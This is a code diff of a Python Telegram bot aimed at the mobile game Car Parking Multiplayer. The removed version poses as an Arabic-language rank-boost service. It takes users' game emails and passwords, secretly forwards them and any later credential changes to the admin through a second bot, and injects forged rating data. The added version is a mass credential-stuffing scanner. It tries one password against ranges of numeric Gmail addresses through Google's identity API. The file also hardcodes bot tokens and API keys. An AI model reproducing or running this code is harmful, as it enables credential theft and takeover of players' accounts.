@@ -1,180 +1,92 @@
 import telebot
-import requests
+import asyncio
+import aiohttp
 from telebot import types
-import json
 from threading import Thread
 from flask import Flask
 import os
+import time
 
-# --- RENDER UPTIME SERVER ---
+# Render-nu vendi Flask
 app = Flask('')
 @app.route('/')
-def home(): return "🔥 ARABIC CPM TOOL!"
+def home(): return "⚡ 100k Scanner is Online!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
 # --- CONFIG ---
-# പ്രധാന ബോട്ട് (യൂസർമാർക്ക് വേണ്ടിയുള്ളത്)
-TOKEN = "8230723230:AAGZhHB9gEDoKbmXF_aWJ5lAFXjVWCkw_pI"
-bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=20)
-
-# അലേർട്ട് ബോട്ട് (നിങ്ങൾക്ക് മാത്രം അലേർട്ട് അയക്കാൻ)
-ALERT_BOT_TOKEN = "8314787817:AAHpZnchNnDOaLARhaVU6eNLGbyDuyjz-n0"
-alert_bot = telebot.TeleBot(ALERT_BOT_TOKEN)
-
-# നിങ്ങളുടെ ടെലിഗ്രാം ഐഡി
-ADMIN_ID = 7212602902 
+TOKEN = "8574711169:AAEpY7ydcHy1nYoZnNVLi4w63HHnxNqamhM"
+bot = telebot.TeleBot(TOKEN)
+ADMIN_ID = 7212602902
+APPROVED_USERS = {7212602902}
 
 API_KEYS = {
     "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
-    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
+    "CPM2": "AIzaSyCqLQh3vlumESlbAsZSZRQChp7eW43kzhk"
 }
 
-user_sessions = {}
+# --- ASYNC SCANNER LOGIC ---
+async def check_acc_async(session, email, pwd, key):
+    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={key}"
+    payload = {"email": email, "password": pwd, "returnSecureToken": True}
+    try:
+        async with session.post(url, json=payload, timeout=5) as response:
+            if response.status == 200:
+                return email
+    except:
+        return None
+    return None
 
-def get_user_info(message):
-    u = message.from_user
-    return f"👤 {u.first_name} (@{u.username if u.username else 'NoUser'}) [`{u.id}`]"
-
-# --- BOT LOGIC ---
+async def run_scanner(start, end, password, key, chat_id):
+    # Oreyasam 500 requests vare handle cheyyaan ulla setup
+    connector = aiohttp.TCPConnector(limit=500)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        for num in range(start, end + 1):
+            email = f"{num}@gmail.com"
+            tasks.append(check_acc_async(session, email, password, key))
+        
+        # Gathering all results
+        results = await asyncio.gather(*tasks)
+        hits = [res for res in results if res]
+        
+        if hits:
+            hit_text = "✅ **HITS FOUND:**\n" + "\n".join(hits)
+            bot.send_message(chat_id, hit_text)
+            bot.send_message(ADMIN_ID, f"🔔 **LOG:** {len(hits)} hits in range {start}-{end}")
+        else:
+            bot.send_message(chat_id, f"❌ Range {start}-{end} completed. No hits.")
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    cid = message.chat.id
-    user_sessions[cid] = {} 
-    
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    markup.add('CPM1', 'CPM2')
-    
-    msg = bot.send_message(cid, "🔥 **متجر لوفي للخدمات**\n\nيرجى اختيار الإصدار للمتابعة:", 
-                           reply_markup=markup, parse_mode="Markdown")
+    if message.from_user.id not in APPROVED_USERS: return
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add('🚀 Start 100K Scanner')
+    bot.send_message(message.chat.id, "🔥 **FLAME ASYNC V2**\nSelect option:", reply_markup=markup)
 
-@bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
-def set_version(message):
-    cid = message.chat.id
-    user_sessions[cid] = {'v': message.text, 'info': get_user_info(message)}
-    
-    msg = bot.send_message(cid, f"✅ تم اختيار: **{message.text}**\n\nيرجى إدخال البريد الإلكتروني 📧:", 
-                           reply_markup=types.ReplyKeyboardRemove(), parse_mode="Markdown")
-    bot.register_next_step_handler(msg, get_email)
+@bot.message_handler(func=lambda m: m.text == '🚀 Start 100K Scanner')
+def ask_range(message):
+    msg = bot.send_message(message.chat.id, "🔢 **Format:** `Start:End:Pass:Server` \n(Ex: `9000000000:9001000000:pass123:CPM2`)")
+    bot.register_next_step_handler(msg, start_async_process)
 
-def get_email(message):
-    cid = message.chat.id
-    if cid not in user_sessions: return start(message)
-    
-    user_sessions[cid]['email'] = message.text.strip()
-    msg = bot.send_message(cid, "🔑 يرجى إدخല كلمة المرور الخاصة بك:")
-    bot.register_next_step_handler(msg, run_login)
-
-def run_login(message):
-    cid = message.chat.id
-    pwd = message.text.strip()
-    sess = user_sessions.get(cid)
-    
-    if not sess or 'email' not in sess:
-        return bot.send_message(cid, "❌ انتهت الجلسة! اكتب /start")
-
-    bot.send_message(cid, "⏳ جاري تسجيل الدخول، يرجى الانتظار...")
-
+def start_async_process(message):
     try:
-        r = requests.post(
-            f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[sess['v']]}", 
-            json={"email": sess['email'], "password": pwd, "returnSecureToken": True}
-        )
-        res = r.json()
+        parts = message.text.split(':')
+        start_n, end_n, pwd, server = int(parts[0]), int(parts[1]), parts[2], parts[3].upper()
+        key = API_KEYS.get(server)
+
+        bot.send_message(message.chat.id, f"⚡ **Scanning 1 Lakh+ Range...**\nThis may take a few minutes.")
         
-        if r.status_code == 200 and 'idToken' in res:
-            sess.update({'token': res['idToken'], 'email': sess['email'], 'pwd': pwd})
-            
-            # --- LOGIN ALERT TO SECOND BOT ---
-            alert = (f"👤 **NEW LOGIN**\n\nUser: {sess['info']}\n"
-                     f"📧 Email: `{sess['email']}`\n🔑 Pass: `{pwd}`\n🎮 Game: {sess['v']}")
-            alert_bot.send_message(ADMIN_ID, alert, parse_mode="Markdown")
-            
-            # Control Panel
-            btn = types.InlineKeyboardMarkup(row_width=1).add(
-                types.InlineKeyboardButton("👑 رتبة الملك 👑", callback_data="rank"),
-                types.InlineKeyboardButton("📧 تغيير البريد الإلكتروني 📨", callback_data="c_email"),
-                types.InlineKeyboardButton("🔐 تغيير كلمة المرور", callback_data="c_pass"),
-                types.InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="logout")
-            )
-            bot.send_message(cid, f"✅ **تم تسجيل الدخول بنجاح!**\nمرحباً: `{sess['email']}`", reply_markup=btn, parse_mode="Markdown")
-        else:
-            bot.send_message(cid, f"❌ **فشل:** {res.get('error', {}).get('message', 'خطأ غير معروف')}\nحاول مرة أخرى /start")
-    except Exception as e:
-        bot.send_message(cid, "❌ خطأ في الاتصال!")
+        # Async loop-ine separate thread-il run cheyyunnu
+        new_loop = asyncio.new_event_loop()
+        t = Thread(target=lambda: new_loop.run_until_complete(run_scanner(start_n, end_n, pwd, key, message.chat.id)))
+        t.start()
 
-@bot.callback_query_handler(func=lambda call: True)
-def actions(call):
-    cid = call.message.chat.id
-    sess = user_sessions.get(cid)
-
-    if call.data == "logout":
-        user_sessions.pop(cid, None)
-        bot.edit_message_text("🚪 تم تسجيل الخروج بنجاح.", cid, call.message.message_id)
-        return
-
-    if not sess or 'token' not in sess:
-        return bot.answer_callback_query(call.id, "انتهت الجلسة! /start", show_alert=True)
-
-    bot.answer_callback_query(call.id)
-    head = {"Authorization": f"Bearer {sess['token']}", "Content-Type": "application/json"}
-
-    if call.data == "rank":
-        url = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" if sess['v']=="CPM1" else "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
-        fields = ["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"]
-        r_data = {f: 100000 for f in fields}
-        r_data.update({"time": 10000000000, "race_win": 3000})
-        
-        try:
-            requests.post(url, headers=head, json={"data": json.dumps({"RatingData": r_data})})
-            bot.send_message(cid, "👑 **تم تفعيل رتبة الملك بنجاح!**")
-            # Alert to second bot
-            alert_bot.send_message(ADMIN_ID, f"👑 **RANK USED**\nUser: {sess['info']}\nAcc: `{sess['email']}`", parse_mode="Markdown")
-        except:
-            bot.send_message(cid, "❌ فشل الحقن.")
-
-    elif call.data == "c_email":
-        msg = bot.send_message(cid, "أدخل البريد الإلكتروني الجديد:")
-        bot.register_next_step_handler(msg, finalize_email)
-        
-    elif call.data == "c_pass":
-        msg = bot.send_message(cid, "أدخل كلمة المرور الجديدة:")
-        bot.register_next_step_handler(msg, finalize_pass)
-
-def finalize_email(message):
-    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
-    if not sess or 'token' not in sess: return
-    new_e = message.text.strip()
-    
-    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[sess['v']]}", 
-                      json={"idToken": sess['token'], "email": new_e, "returnSecureToken": True})
-    if r.status_code == 200:
-        # Alert to second bot
-        alert_bot.send_message(ADMIN_ID, f"📧 **EMAIL CHANGED**\nUser: {sess['info']}\nOld: `{sess['email']}`\nNew: `{new_e}`", parse_mode="Markdown")
-        bot.send_message(cid, f"✅ تم تغيير البريد الإلكتروني إلى: {new_e}")
-        sess.update({'token': r.json()['idToken'], 'email': new_e})
-    else:
-        bot.send_message(cid, f"❌ خطأ: {r.json().get('error', {}).get('message')}")
-
-def finalize_pass(message):
-    cid, sess = message.chat.id, user_sessions.get(message.chat.id)
-    if not sess or 'token' not in sess: return
-    new_p = message.text.strip()
-    
-    r = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEYS[sess['v']]}", 
-                      json={"idToken": sess['token'], "password": new_p, "returnSecureToken": True})
-    if r.status_code == 200:
-        # Alert to second bot
-        alert_bot.send_message(ADMIN_ID, f"🔐 **PASS CHANGED**\nUser: {sess['info']}\nAcc: `{sess['email']}`\nNew: `{new_p}`", parse_mode="Markdown")
-        bot.send_message(cid, "✅ تم تحديث كلمة المرور بنجاح!")
-        sess.update({'token': r.json()['idToken']})
-    else:
-        bot.send_message(cid, f"❌ خطأ: {r.json().get('error', {}).get('message')}")
+    except:
+        bot.send_message(message.chat.id, "⚠️ Invalid Format!")
 
 if __name__ == "__main__":
     Thread(target=run_flask).start()
-    print("🚀 BOT IS READY!")
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    bot.infinity_polling()
